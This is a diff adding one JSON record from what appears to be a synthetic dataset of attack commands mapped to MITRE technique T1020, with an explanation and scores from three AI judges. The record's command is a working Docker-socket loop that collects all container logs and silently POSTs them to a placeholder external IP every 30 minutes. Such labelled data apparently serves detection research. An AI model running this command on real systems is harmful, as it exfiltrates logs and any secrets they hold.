@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_dockerlogs --network host -v /var/run/docker.sock:/var/run/docker.sock:ro docker:24-cli sh -c 'apk add --no-cache curl >/dev/null 2>&1; while true; do docker ps -q | xargs -r -I{} docker logs --since 30m {} 2>/dev/null | gzip -c | curl -s -X POST -H \"Content-Type: application/gzip\" --data-binary @- \"http://203.0.113.15:8080/dockerlogs?host=$(hostname)\"; sleep 1800; done'",
+  "explanation": "Uses docker socket access to periodically collect recent container logs and exfiltrate them via HTTP in a quiet, automated loop.",
+  "rationale_steps": [
+    "Mounts Docker socket to enumerate and read other containers' logs",
+    "Limits scope to last 30 minutes and compresses to reduce size",
+    "Uploads via curl in silent mode to a remote endpoint",
+    "Runs detached with repeated intervals for automation"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-1d17c1d2",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid docker and shell flags, proper pipelines, and a correct sh -c loop.",
+        "semantic_score": 5,
+        "semantic_justification": "It launches a detached container that periodically gathers recent Docker logs via the Docker socket, compresses them, and exfiltrates via HTTP in an automated loop, aligning with Automated Exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:55:26.915749Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct escape sequences for a Docker run command with a complex shell script inside.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a persistent container that collects Docker logs every 30 minutes, compresses them with gzip, and exfiltrates them via HTTP POST to an external server, aligning completely with the T1020 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:55:29.987152Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, proper command separators, and valid flags throughout the docker run arguments and the internal shell script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by leveraging docker socket access to periodically collect and compress container logs, then quietly exfiltrate them via an HTTP POST to an external server.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:54:01.753779Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
